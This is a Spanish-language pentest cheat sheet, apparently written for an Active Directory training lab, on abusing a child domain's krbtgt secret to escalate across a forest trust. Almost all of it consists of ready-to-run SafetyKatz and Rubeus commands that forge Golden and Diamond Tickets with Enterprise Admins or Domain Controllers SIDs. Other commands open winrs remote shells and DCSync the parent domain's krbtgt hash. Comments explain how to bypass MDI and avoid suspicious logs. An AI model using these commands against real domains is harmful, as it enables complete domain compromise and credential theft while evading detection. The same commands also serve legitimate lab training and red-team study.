# Krbtgt Secret Abuse 

Tags: #AD #Krbtgt 

## Golden ticket con un usuario 

```powershell 
! Usuario: Domain Admin del dominio hijo 

# Solo necesitamos forjar un Golden Ticket (no un TGT entre dominios / inter-realm) con el sIDHistory del grupo Enterprise Admins.
# Debido a la relación de confianza, el dominio padre confiará en ese TGT.

❯ SafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
# Forjar un Golden Ticket del dominio hijo incluyendo el SID de Enterprise Admins del padre en /sids — el dominio padre confía en el ticket por la relación de trust, otorgando privilegios de EA sin necesidad de forjar un inter-realm TGT por separado.
# /user   → usuario a impersonar
# /domain → dominio hijo
# /sid    → SID del dominio hijo
# /sids   → SID del grupo Enterprise Admins del dominio padre (S-1-5-21-...-519)
# /krbtgt → hash NTLM de krbtgt del dominio hijo
# /ptt    → inyectar el ticket directamente en la sesión actual
```

```powershell 
! Usuario: Domain Admin del dominio hijo

❯ .\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
# Forjar un Golden Ticket evasivo del dominio hijo con SIDHistory de Enterprise Admins del padre — versión OPSEC-friendly del ataque de escalado entre dominios.
# /sids   → SID del grupo Enterprise Admins del dominio padre (S-1-5-21-...-519)
# /aes256 → clave AES256 de krbtgt del dominio hijo (más sigiloso que RC4)
# /netbios → nombre NetBIOS del dominio hijo
# /ptt    → inyectar el ticket directamente en la sesión actual

❯ winrs -r:mcorp-dc cmd
# Abrir una shell remota en el equipo objetivo usando el ticket inyectado
	❯ set username 
```

## Golden ticket con la identidad de maquina 

```powershell 
! Usuario: Domain Admin del dominio hijo (Recomendado)

❯ SafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
# Forjar un Golden Ticket usando la identidad del DC (dcorp-dc$) en lugar de un usuario — evita logs sospechosos y bypass de MDI al parecer tráfico legítimo de replicación.
# /user   → identidad del DC (cuenta de máquina)
# /id     → RID de la cuenta de máquina del DC (1000)
# /sids   → S-1-5-21-...-516 (Domain Controllers del padre) + S-1-5-9 (Enterprise Domain Controllers)

❯ SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
# Ejecutar DCSync contra el dominio padre usando el ticket inyectado — volcar el hash de krbtgt del dominio padre para completar el escalado de bosque.
```

```powershell 
! Usuario: Domain Admin del dominio hijo

❯ Rubeus.exe golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:dcorp-dc$ /id:1000 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /dc:DCORP-DC.dollarcorp.moneycorp.local /ptt
# Igual que el anterior pero usando Rubeus con AES256 en lugar de RC4 — forja el Golden Ticket con identidad del DC para bypass de MDI evitando logs sospechosos e inyecta en la sesión actual.
# /aes256 → clave AES256 de krbtgt del dominio hijo (más sigiloso que RC4)
# /user   → identidad del DC (cuenta de máquina)
# /id     → RID de la cuenta de máquina del DC (1000)
# /sids   → S-1-5-21-...-516 (Domain Controllers del padre) + S-1-5-9 (Enterprise Domain Controllers)
# /dc     → DC del dominio hijo para consultas LDAP

❯ SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
# Ejecutar DCSync contra el dominio padre usando el ticket inyectado — volcar el hash de krbtgt del dominio padre para completar el escalado de bosque.
```

## Diamond ticket 

```powershell 
! Usuario: Domain Admin del dominio hijo (Recomendado)

❯ Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
# Forjar un Diamond Ticket con SIDHistory usando la identidad del DC — evita logs sospechosos en el DC hijo y padre, y bypass de MDI al solicitar un TGT real y modificarlo en memoria.
# /krbkey       → AES key de krbtgt del dominio hijo
# /tgtdeleg     → obtiene TGT del usuario actual via delegación sin necesidad de contraseña
# /ticketuser   → identidad del DC (cuenta de máquina) para bypass de MDI
# /ticketuserid → RID de la cuenta de máquina del DC (1000)
# /sids         → S-1-5-21-...-516 (Domain Controllers del padre) + S-1-5-9 (Enterprise Domain Controllers)
# /createnetonly → crea proceso sacrificio para inyectar el ticket sin contaminar la sesión actual

❯ SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
# Ejecutar DCSync contra el dominio padre usando el ticket inyectado — volcar el hash de krbtgt del dominio padre para completar el escalado de bosque.
```


![](Pasted%20image%2020260422173441.png)